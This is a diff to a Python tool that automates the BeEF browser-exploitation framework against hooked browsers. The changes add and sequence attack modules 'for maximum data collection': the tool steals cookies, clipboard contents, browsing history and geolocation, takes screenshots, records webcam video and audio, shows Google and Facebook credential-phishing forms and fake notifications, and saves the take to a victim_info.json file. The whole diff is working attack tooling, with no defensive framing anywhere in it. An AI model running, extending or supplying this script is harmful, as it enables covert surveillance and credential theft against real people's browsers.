@@ -39,18 +39,21 @@ def get_local_ip():
 def check_beef_running():
     """Check if BeEF is running and accessible"""
     try:
+        # Check if BeEF API is responding
         response = requests.get(
-            f'http://{BEEF_HOST}:{BEEF_PORT}/ui/panel',
+            f'http://{BEEF_HOST}:{BEEF_PORT}/api/hooks',
             timeout=2
         )
-        return response.status_code == 200
+        # BeEF returns 401 if running but not authenticated, or 200 if token is cached
+        return response.status_code in [200, 401]
     except:
         return False
 
 def get_beef_token():
     """Get BeEF API authentication token"""
     try:
-        # Try the new API endpoint first
+        # BeEF uses HTTP Basic Auth for API, not token-based
+        # We'll use username:password in URL params
         response = requests.post(
             f'http://{BEEF_HOST}:{BEEF_PORT}/api/admin/login',
             json={
@@ -62,14 +65,27 @@ def get_beef_token():
         
         if response.status_code == 200:
             data = response.json()
+            # BeEF returns token on successful login
             if 'token' in data:
                 return data['token']
+            # Some versions might return success without token
+            # In this case, we'll use Basic Auth
         
-        return None
+        # Fallback: try to get token from UI session
+        token = get_api_token_from_ui()
+        if token:
+            return token
+            
+        # Last resort: return a placeholder to use Basic Auth
+        return 'use_basic_auth'
         
     except Exception as e:
-        console.print(f"[yellow]Token fetch failed: {e}[/yellow]")
-        return None
+        console.print(f"[yellow]Token fetch failed: {e}, trying alternative methods...[/yellow]")
+        # Try UI token extraction
+        token = get_api_token_from_ui()
+        if token:
+            return token
+        return 'use_basic_auth'
 
 def get_api_token_from_ui():
     """Get token by scraping the UI page"""
@@ -110,27 +126,37 @@ def start_beef():
     console.print("[yellow]Starting BeEF (this may take 10-15 seconds)...[/yellow]")
     
     try:
+        # Start BeEF process
         process = subprocess.Popen(
             ['beef-xss'],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            start_new_session=True
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            start_new_session=True,
+            text=True
         )
         
-        for i in range(15):
+        # Wait for BeEF to start with better detection
+        max_wait = 20
+        for i in range(max_wait):
             time.sleep(1)
             if check_beef_running():
                 console.print("\n[green]✓ BeEF started successfully![/green]")
                 console.print(f"[blue]BeEF UI: http://{BEEF_HOST}:{BEEF_PORT}/ui/panel[/blue]")
                 console.print(f"[blue]Credentials: {BEEF_USER} / {BEEF_PASS}[/blue]")
                 console.print(f"[cyan]Process ID: {process.pid}[/cyan]\n")
+                
+                # Give it 2 more seconds to fully initialize
+                console.print("[yellow]Waiting for BeEF to fully initialize...[/yellow]")
+                time.sleep(2)
+                
                 return True
             
-            if i % 3 == 0:
-                console.print(f"[yellow]Waiting... ({i+1}/15)[/yellow]")
+            if i % 3 == 0 and i > 0:
+                console.print(f"[yellow]Still waiting... ({i+1}/{max_wait})[/yellow]")
         
         console.print("\n[red]✗ BeEF did not start properly![/red]")
-        console.print("[yellow]Try running manually: beef-xss[/yellow]\n")
+        console.print("[yellow]Try running manually: beef-xss[/yellow]")
+        console.print("[yellow]Or check if another instance is already running on port 3000[/yellow]\n")
         return False
         
     except FileNotFoundError:
@@ -149,11 +175,19 @@ def get_hooked_browsers():
             console.print(f"[red]Failed to get API token[/red]")
             return []
         
-        response = requests.get(
-            f'http://{BEEF_HOST}:{BEEF_PORT}/api/hooks',
-            params={'token': token},
-            timeout=5
-        )
+        # Use proper authentication
+        if token == 'use_basic_auth':
+            response = requests.get(
+                f'http://{BEEF_HOST}:{BEEF_PORT}/api/hooks',
+                auth=(BEEF_USER, BEEF_PASS),
+                timeout=5
+            )
+        else:
+            response = requests.get(
+                f'http://{BEEF_HOST}:{BEEF_PORT}/api/hooks',
+                params={'token': token},
+                timeout=5
+            )
         
         if response.status_code == 200:
             data = response.json()
@@ -273,35 +307,67 @@ def run_all_exploits(session_id, save_results=False):
     """Execute all exploits against a hooked browser"""
     console.print(f"\n[bold cyan]🎯 Running ALL exploits on session: {session_id}[/bold cyan]\n")
     
+    # Sequence of exploits - ordered for maximum data collection
     exploits_list = [
-        ('fingerprint', None),
-        ('geolocation', None),
-        ('cookies', None),
-        ('clipboard', None),
-        ('history', None),
-        ('screenshot', None),
-        ('webcam', None),
-        ('record_start', None),
-        ('pretty_theft', None),
-        ('fake_notification', None),
-        ('alert', 'Your browser has been compromised!'),
-        ('redirect', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'),
+        # Phase 1: Information Gathering (silent, no user interaction)
+        ('fingerprint', None, 2),           # Get browser fingerprint
+        ('geolocation', None, 2),           # Get location
+        ('cookies', None, 2),               # Get cookies
+        ('detect_social', None, 3),         # Detect logged-in social networks
+        ('clipboard', None, 2),             # Get clipboard content
+        ('history', None, 3),               # Get browsing history
+        
+        # Phase 2: Media Capture (requires permissions but camera/mic already granted)
+        ('screenshot', None, 3),            # Take screenshot
+        ('webcam_record', None, 12),        # Record 10 seconds of video (wait 12s total)
+        ('record_audio_start', None, 1),    # Start audio recording
+        
+        # Phase 3: Wait for audio recording
+        ('_wait', 10, 10),                  # Wait 10 seconds for audio
+        ('record_audio_stop', None, 2),     # Stop audio recording
+        
+        # Phase 4: Social Engineering (visible to user)
+        ('google_phishing', None, 5),       # Google phishing form (for prize claim)
+        ('fake_notification', None, 3),     # Fake browser notification
+        
+        # Phase 5: Optional - Credential theft (if google phishing fails)
+        # ('pretty_theft', None, 3),        # Facebook login phishing (uncomment if needed)
+        
+        # Phase 6: Final actions
+        # ('alert', 'Congratulations! Check your email for prize details.', 2),
+        # ('redirect', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', 0),  # Rickroll at the end
     ]
     
     results = []
-    for exploit_name, param in exploits_list:
+    for item in exploits_list:
+        if len(item) == 3:
+            exploit_name, param, wait_time = item
+        else:
+            exploit_name, param = item
+            wait_time = 2
+        
+        # Special case: just wait
+        if exploit_name == '_wait':
+            console.print(f"[cyan]⏳ Waiting {param} seconds for previous commands to complete...[/cyan]")
+            time.sleep(param)
+            continue
+        
         console.print(f"[yellow]→ Running {exploit_name}...[/yellow]")
         success = run_exploit(exploit_name, session_id, param)
         results.append((exploit_name, success))
-        time.sleep(1)  # Small delay between exploits
+        
+        # Wait for command to execute before next one
+        if wait_time > 0:
+            console.print(f"[cyan]   Waiting {wait_time}s for execution...[/cyan]")
+            time.sleep(wait_time)
     
     console.print("\n[bold cyan]═══════════════════════════════════════[/bold cyan]")
     console.print("[bold cyan]         EXPLOIT SUMMARY[/bold cyan]")
     console.print("[bold cyan]═══════════════════════════════════════[/bold cyan]\n")
     
     table = Table(show_header=True)
-    table.add_column("Exploit", style="cyan")
-    table.add_column("Status", style="green")
+    table.add_column("Exploit", style="cyan", width=25)
+    table.add_column("Status", style="green", width=15)
     
     for exploit_name, success in results:
         status = "✓ Success" if success else "✗ Failed"
@@ -312,8 +378,8 @@ def run_all_exploits(session_id, save_results=False):
     console.print(f"\n[cyan]Check BeEF UI for detailed results: http://{BEEF_HOST}:{BEEF_PORT}/ui/panel[/cyan]\n")
     
     if save_results:
-        console.print("\n[yellow]⏳ Waiting 10 seconds for commands to execute...[/yellow]")
-        time.sleep(10)  # Wait for commands to complete
+        console.print("\n[yellow]⏳ Waiting 15 seconds for all commands to complete...[/yellow]")
+        time.sleep(15)  # Extra wait for all data to be collected
         console.print("[yellow]Fetching and saving results...[/yellow]")
         save_exploit_results(session_id)
 
@@ -329,11 +395,19 @@ def save_exploit_results(session_id):
         results_dir = f"results_{session_id[:8]}_{timestamp}"
         os.makedirs(results_dir, exist_ok=True)
         
-        response = requests.get(
-            f'http://{BEEF_HOST}:{BEEF_PORT}/api/hooks/{session_id}',
-            params={'token': token},
-            timeout=10
-        )
+        # Use proper authentication
+        if token == 'use_basic_auth':
+            response = requests.get(
+                f'http://{BEEF_HOST}:{BEEF_PORT}/api/hooks/{session_id}',
+                auth=(BEEF_USER, BEEF_PASS),
+                timeout=10
+            )
+        else:
+            response = requests.get(
+                f'http://{BEEF_HOST}:{BEEF_PORT}/api/hooks/{session_id}',
+                params={'token': token},
+                timeout=10
+            )
         
         if response.status_code != 200:
             console.print(f"[red]Failed to fetch results (Status: {response.status_code})[/red]")
@@ -354,21 +428,36 @@ def save_exploit_results(session_id):
         with open(f"{results_dir}/victim_info.json", 'w') as f:
             json.dump(victim_info, f, indent=2)
         
-        logs_response = requests.get(
-            f'http://{BEEF_HOST}:{BEEF_PORT}/api/logs',
-            params={'token': token},
-            timeout=10
-        )
+        # Get command logs with proper auth
+        if token == 'use_basic_auth':
+            logs_response = requests.get(
+                f'http://{BEEF_HOST}:{BEEF_PORT}/api/logs',
+                auth=(BEEF_USER, BEEF_PASS),
+                timeout=10
+            )
+        else:
+            logs_response = requests.get(
+                f'http://{BEEF_HOST}:{BEEF_PORT}/api/logs',
+                params={'token': token},
+                timeout=10
+            )
         
         saved_count = 0
         
         try:
-            ui_response = requests.get(
-                f'http://{BEEF_HOST}:{BEEF_PORT}/ui/modules/commandmodule/commands.json',
-                cookies={'BEEFTOKEN': token},
-                params={'zombie_session': session_id},
-                timeout=10
-            )
+            # Try to get command results from API endpoint
+            if token == 'use_basic_auth':
+                ui_response = requests.get(
+                    f'http://{BEEF_HOST}:{BEEF_PORT}/api/modules/{session_id}',
+                    auth=(BEEF_USER, BEEF_PASS),
+                    timeout=10
+                )
+            else:
+                ui_response = requests.get(
+                    f'http://{BEEF_HOST}:{BEEF_PORT}/api/modules/{session_id}',
+                    params={'token': token},
+                    timeout=10
+                )
             
             if ui_response.status_code == 200:
                 commands_data = ui_response.json()
@@ -445,59 +534,79 @@ def run_exploit(exploit_name, session_id, extra_param=None):
     # Define available exploits with their module IDs
     exploits = {
         'alert': {
-            'module': 285,  # Create Alert Dialog
+            'module_id': 285,  # Create Alert Dialog
             'params': {'text': extra_param or 'You have been hacked!'}
         },
+        'alert2': {
+            'module_id': 40,  # Alternative Alert Dialog
+            'params': {'question': extra_param or 'Your system has been compromised!'}
+        },
         'js': {
-            'module': 80,  # Raw JavaScript
-            'params': {'code': extra_param or 'alert("HACKED!")'}
+            'module_id': 80,  # Raw JavaScript
+            'params': {'cmd': extra_param or 'alert("Your PC has been hacked!")'}  # Parameter is 'cmd' not 'js'
         },
         'redirect': {
-            'module': 260,  # Redirect Browser (Rickroll)
+            'module_id': 260,  # Redirect Browser (Rickroll)
             'params': {'redirect_url': extra_param or 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'}
         },
         'geolocation': {
-            'module': 104,  # Get Geolocation (API)
+            'module_id': 104,  # Get Geolocation (API)
             'params': {}
         },
         'cookies': {
-            'module': 277,  # Get Cookie
+            'module_id': 277,  # Get Cookie
             'params': {}
         },
         'screenshot': {
-            'module': 246,  # Screenshot
+            'module_id': 246,  # Screenshot
             'params': {}
         },
         'fingerprint': {
-            'module': 289,  # Fingerprint Browser
+            'module_id': 289,  # Fingerprint Browser
             'params': {}
         },
         'history': {
-            'module': 288,  # Get Visited Domains
+            'module_id': 288,  # Get Visited Domains
             'params': {}
         },
         'webcam': {
-            'module': 252,  # Webcam HTML5
+            'module_id': 252,  # Webcam HTML5 (request permission)
             'params': {}
+        },
+        'webcam_record': {
+            'module_id': 214,  # Webcam with recording capability
+            'params': {'duration': '10'}  # Record for 10 seconds
         },
         'clipboard': {
-            'module': 127,  # Get Clipboard
+            'module_id': 127,  # Get Clipboard
             'params': {}
         },
-        'record_start': {
-            'module': 26,  # Start Recording Audio
+        'record_audio_start': {
+            'module_id': 26,  # Start Recording Audio
             'params': {}
         },
-        'record_stop': {
-            'module': 25,  # Stop Recording Audio
+        'record_audio_stop': {
+            'module_id': 25,  # Stop Recording Audio
             'params': {}
         },
         'pretty_theft': {
-            'module': 8,  # Pretty Theft (credential phishing)
+            'module_id': 8,  # Facebook type UI for login (credential theft)
+            'params': {}
+        },
+        'google_phishing': {
+            'module_id': 11,  # Google Phishing
             'params': {}
         },
         'fake_notification': {
-            'module': 17,  # Fake Notification Bar (Chrome)
+            'module_id': 17,  # Fake Notification Bar (Chrome)
+            'params': {}
+        },
+        'fake_notification2': {
+            'module_id': 18,  # Alternative Fake Notification
+            'params': {}
+        },
+        'detect_social': {
+            'module_id': 64,  # Detect Social Networks
             'params': {}
         }
     }
@@ -515,27 +624,23 @@ def run_exploit(exploit_name, session_id, extra_param=None):
         console.print(f"[red]Failed to get API token[/red]")
         return False
     
-    # Prepare payload
-    payload = {
-        'command_module_id': exploit['module'],
-        'command_module_params': exploit['params']
-    }
-    
     try:
         console.print(f"\n[yellow]Executing {exploit_name}...[/yellow]")
         
-        form_data = {
-            'command_module_id': str(exploit['module']),
-            'hb_id': session_id
-        }
+        # BeEF API expects this format for command execution
+        # Use the REST API endpoint, not the UI endpoint
+        api_url = f'http://{BEEF_HOST}:{BEEF_PORT}/api/modules/{session_id}/{exploit["module_id"]}'
         
-        for key, value in exploit['params'].items():
-            form_data[key] = str(value)
+        # Prepare the payload in the format BeEF expects
+        payload = exploit['params']
         
+        # Try with token in URL (most compatible method)
         response = requests.post(
-            f'http://{BEEF_HOST}:{BEEF_PORT}/ui/modules/commandmodule/new',
-            data=form_data,
-            cookies={'BEEFTOKEN': token},
+            api_url,
+            params={'token': token} if token != 'use_basic_auth' else {},
+            auth=(BEEF_USER, BEEF_PASS) if token == 'use_basic_auth' else None,
+            json=payload,
+            headers={'Content-Type': 'application/json'},
             timeout=10
         )
         
@@ -545,8 +650,35 @@ def run_exploit(exploit_name, session_id, extra_param=None):
             return True
         else:
             console.print(f"[red]✗ Failed (Status: {response.status_code})[/red]")
-            console.print(f"[yellow]{response.text[:500]}[/yellow]\n")
-            return False
+            console.print(f"[yellow]Response: {response.text[:500]}[/yellow]")
+            
+            # If API method failed, try alternative method using the UI endpoint
+            console.print(f"[yellow]Trying alternative method...[/yellow]")
+            
+            # Some BeEF versions require using the web UI endpoint
+            ui_url = f'http://{BEEF_HOST}:{BEEF_PORT}/api/modules/{session_id}/{exploit["module_id"]}'
+            
+            # Prepare form data (some modules expect form-encoded data)
+            form_data = {}
+            for key, value in exploit['params'].items():
+                form_data[key] = str(value)
+            
+            response2 = requests.post(
+                ui_url,
+                params={'token': token} if token != 'use_basic_auth' else {},
+                auth=(BEEF_USER, BEEF_PASS),
+                data=form_data,
+                timeout=10
+            )
+            
+            if response2.status_code == 200:
+                console.print(f"[green]✓ {exploit_name.upper()} executed successfully (alternative method)![/green]")
+                console.print(f"[cyan]Check BeEF UI for results: http://{BEEF_HOST}:{BEEF_PORT}/ui/panel[/cyan]\n")
+                return True
+            else:
+                console.print(f"[red]✗ Alternative method also failed (Status: {response2.status_code})[/red]")
+                console.print(f"[yellow]Make sure the session ID is correct and the browser is still hooked[/yellow]\n")
+                return False
             
     except Exception as e:
         console.print(f"[red]Error: {e}[/red]\n")
@@ -579,10 +711,11 @@ Examples:
     parser.add_argument('--list', action='store_true',
                        help='List all hooked browsers')
     parser.add_argument('--exploit', 
-                       choices=['alert', 'js', 'redirect', 'geolocation', 'cookies',
-                               'screenshot', 'fingerprint', 'history', 'webcam', 
-                               'clipboard', 'record_start', 'record_stop', 
-                               'pretty_theft', 'fake_notification', 'all'],
+                       choices=['alert', 'alert2', 'js', 'redirect', 'geolocation', 'cookies',
+                               'screenshot', 'fingerprint', 'history', 'webcam', 'webcam_record',
+                               'clipboard', 'record_audio_start', 'record_audio_stop', 
+                               'pretty_theft', 'google_phishing', 'fake_notification', 
+                               'fake_notification2', 'detect_social', 'all'],
                        help='Execute exploit (use "all" to run all exploits)')
     parser.add_argument('--session', help='Target session ID')
     parser.add_argument('--code', help='JavaScript code (for js exploit)')
